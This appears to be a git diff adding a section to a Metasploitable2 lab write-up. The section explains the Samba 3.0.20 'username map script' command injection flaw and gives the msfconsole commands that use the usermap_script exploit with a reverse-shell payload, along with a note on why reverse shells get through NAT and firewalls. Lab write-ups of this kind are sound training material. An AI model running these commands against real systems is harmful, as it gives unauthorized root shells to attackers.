@@ -149,3 +149,18 @@ It is caused because Metaspoitable2 runs on 2010 OpenSSH server and Kali is on t
 ```bash
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<target-ip>
 ```
+
+### 4b - Samba 3.0.20 
+
+Samba 3.0.20 had an option called ```username map script``` that, when configured, passed the username to a shell script. The bug: it didn't sanitize the username, so you could inject shell metacharacters and execute arbitrary commands as root before any authentication happened. This is a Command Injection. 
+
+In Kali (msfconsole) run: 
+```bash
+search samba
+use exploit/multi/samba/usermap_script
+set RHOSTS <target-ip>
+set payload cmd/unix/reverse
+set LHOST <attacker-ip>
+exploit
+```
+That gives you a reverse shell - the *target* connects back to you. This matters: if the target is behind NAT or a firewall blocking inbound, a reverse shell often works where a bind shell wouldn't.
